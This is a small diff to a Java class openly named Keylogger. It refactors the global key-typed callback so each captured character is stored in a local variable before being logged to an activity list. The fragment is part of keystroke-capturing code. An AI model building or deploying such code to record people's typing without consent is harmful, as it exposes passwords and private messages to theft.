@@ -26,7 +26,10 @@ public class Keylogger implements NativeKeyListener {
 	@Override
 	public void nativeKeyTyped(NativeKeyEvent arg0) {		
 		try {					
-		    Activities.add(new Key(arg0.getKeyChar()));
+			char ckey = arg0.getKeyChar();
+			
+			Activities.add(new Key(ckey));
+			
 		} catch (Exception e) {
 			System.err.println("Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
 		}
